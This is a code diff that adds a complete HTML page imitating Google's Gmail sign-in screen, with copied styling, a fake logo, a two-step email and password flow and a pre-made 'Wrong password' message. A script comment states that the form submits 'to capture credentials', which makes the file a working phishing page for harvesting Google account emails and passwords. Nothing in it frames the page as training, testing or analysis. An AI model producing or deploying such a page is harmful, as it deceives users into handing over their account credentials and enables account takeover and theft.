@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 450px;
+        }
+
+        .card {
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            background: #fff;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #202124;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 8px;
+        }
+
+        input[type="email"],
+        input[type="password"],
+        input[type="text"] {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            background: transparent;
+            color: #202124;
+            transition: border-color 0.2s;
+        }
+
+        input[type="email"]:hover,
+        input[type="password"]:hover,
+        input[type="text"]:hover {
+            border-color: #5f6368;
+        }
+
+        input[type="email"]:focus,
+        input[type="password"]:focus,
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #1a73e8;
+            border-width: 2px;
+            padding: 12px 14px;
+        }
+
+        .button-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 32px;
+        }
+
+        .link {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .link:hover {
+            text-decoration: underline;
+        }
+
+        .button {
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            background-color: #1a73e8;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.2s, box-shadow 0.2s;
+        }
+
+        .button:hover {
+            background-color: #1765cc;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+        }
+
+        .button:active {
+            background-color: #1557b0;
+        }
+
+        .error {
+            background-color: #fce8e6;
+            border: 1px solid #fce8e6;
+            padding: 16px;
+            margin-bottom: 16px;
+            border-radius: 4px;
+            display: none;
+        }
+
+        .error-text {
+            color: #d93025;
+            font-size: 14px;
+            display: flex;
+            align-items: flex-start;
+        }
+
+        .error-icon {
+            margin-right: 12px;
+            color: #d93025;
+        }
+
+        .footer {
+            margin-top: 24px;
+            text-align: center;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin-top: 16px;
+            font-size: 12px;
+        }
+
+        .language-selector {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 24px;
+        }
+
+        select {
+            padding: 4px 24px 4px 8px;
+            font-size: 12px;
+            color: #5f6368;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            background: #fff;
+            cursor: pointer;
+        }
+
+        #emailSection, #passwordSection {
+            display: none;
+        }
+
+        .profile-info {
+            display: flex;
+            align-items: center;
+            margin-bottom: 24px;
+            padding: 12px;
+            border-radius: 8px;
+            background: #f1f3f4;
+        }
+
+        .profile-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #1a73e8 0%, #34a853 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 18px;
+            font-weight: 500;
+            margin-right: 16px;
+        }
+
+        .profile-email {
+            font-size: 14px;
+            color: #202124;
+        }
+
+        .info-box {
+            background: #e8f0fe;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 24px;
+        }
+
+        .info-box p {
+            color: #1967d2;
+            font-size: 14px;
+            line-height: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="logo">
+                <svg width="75" height="24" viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M9.24 8.19v5.88h7.44c-.24 1.56-.96 2.88-2.04 3.78-1.32 1.08-3 1.74-5.4 1.74-4.32 0-7.68-3.48-7.68-7.8s3.36-7.8 7.68-7.8c2.28 0 3.96.9 5.22 2.04l4.26-4.26C16.32 1.08 13.08 0 9.24 0 4.14 0 0 4.14 0 9.24s4.14 9.24 9.24 9.24c2.7 0 5.04-.9 6.72-2.46 1.74-1.56 2.28-3.78 2.28-5.58 0-.54-.06-1.08-.12-1.56H9.24v-.69z" fill="#4285F4"/>
+                    <path d="M25.92 0v18h-2.4V0h2.4z" fill="#EA4335"/>
+                    <path d="M42.84 14.52c-1.32 1.32-3.12 2.04-5.22 2.04-4.08 0-7.44-3.36-7.44-7.8 0-4.32 3.36-7.8 7.44-7.8 2.1 0 3.9.72 5.22 2.04l-1.68 1.68c-.96-.96-2.28-1.44-3.54-1.44-2.88 0-5.16 2.34-5.16 5.52s2.28 5.52 5.16 5.52c1.26 0 2.58-.48 3.54-1.44l1.68 1.68z" fill="#FBBC04"/>
+                    <path d="M59.76 14.52c-1.32 1.32-3.12 2.04-5.22 2.04-4.08 0-7.44-3.36-7.44-7.8 0-4.32 3.36-7.8 7.44-7.8 2.1 0 3.9.72 5.22 2.04l-1.68 1.68c-.96-.96-2.28-1.44-3.54-1.44-2.88 0-5.16 2.34-5.16 5.52s2.28 5.52 5.16 5.52c1.26 0 2.58-.48 3.54-1.44l1.68 1.68z" fill="#34A853"/>
+                </svg>
+            </div>
+
+            <div id="errorDiv" class="error">
+                <div class="error-text">
+                    <span class="error-icon">⚠</span>
+                    <div>
+                        <strong>Wrong password.</strong> Try again or click Forgot password to reset it.
+                    </div>
+                </div>
+            </div>
+
+            <!-- Email Section -->
+            <div id="emailSection">
+                <h1>Sign in</h1>
+                <div class="subtitle">to continue to Gmail</div>
+
+                <form id="emailForm">
+                    <div class="form-group">
+                        <input type="email" id="email" name="email" placeholder="Email or phone" required autofocus>
+                    </div>
+
+                    <div class="form-group">
+                        <a href="#" class="link">Forgot email?</a>
+                    </div>
+
+                    <div class="info-box">
+                        <p>Not your computer? Use Guest mode to sign in privately. <a href="#" class="link">Learn more</a></p>
+                    </div>
+
+                    <div class="button-container">
+                        <a href="#" class="link">Create account</a>
+                        <button type="submit" class="button">Next</button>
+                    </div>
+                </form>
+            </div>
+
+            <!-- Password Section -->
+            <div id="passwordSection">
+                <h1>Welcome</h1>
+
+                <div class="profile-info">
+                    <div class="profile-avatar" id="avatar"></div>
+                    <div class="profile-email" id="userEmail"></div>
+                </div>
+
+                <form id="passwordForm" method="POST">
+                    <div class="form-group">
+                        <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label>
+                            <input type="checkbox" name="showPassword" id="showPassword" style="width: auto; display: inline-block; margin-right: 8px;">
+                            Show password
+                        </label>
+                    </div>
+
+                    <div class="button-container">
+                        <a href="#" class="link">Forgot password?</a>
+                        <button type="submit" class="button">Next</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <div class="footer">
+            <div class="language-selector">
+                <select>
+                    <option>English (United States)</option>
+                    <option>Español</option>
+                    <option>Français</option>
+                </select>
+            </div>
+            <div class="footer-links">
+                <a href="#" class="link">Help</a>
+                <a href="#" class="link">Privacy</a>
+                <a href="#" class="link">Terms</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Show email section by default
+        document.getElementById('emailSection').style.display = 'block';
+
+        // Handle email submission
+        document.getElementById('emailForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+
+            // Store email in hidden field
+            const hiddenEmail = document.createElement('input');
+            hiddenEmail.type = 'hidden';
+            hiddenEmail.name = 'email';
+            hiddenEmail.value = email;
+            document.getElementById('passwordForm').appendChild(hiddenEmail);
+
+            // Show email in password section
+            document.getElementById('userEmail').textContent = email;
+
+            // Set avatar initial
+            const initial = email.charAt(0).toUpperCase();
+            document.getElementById('avatar').textContent = initial;
+
+            // Switch to password section
+            document.getElementById('emailSection').style.display = 'none';
+            document.getElementById('passwordSection').style.display = 'block';
+            document.getElementById('password').focus();
+        });
+
+        // Handle password submission
+        document.getElementById('passwordForm').addEventListener('submit', function(e) {
+            // Let form submit naturally to capture credentials
+        });
+
+        // Show/hide password
+        document.getElementById('showPassword').addEventListener('change', function() {
+            const passwordField = document.getElementById('password');
+            passwordField.type = this.checked ? 'text' : 'password';
+        });
+    </script>
+</body>
+</html>
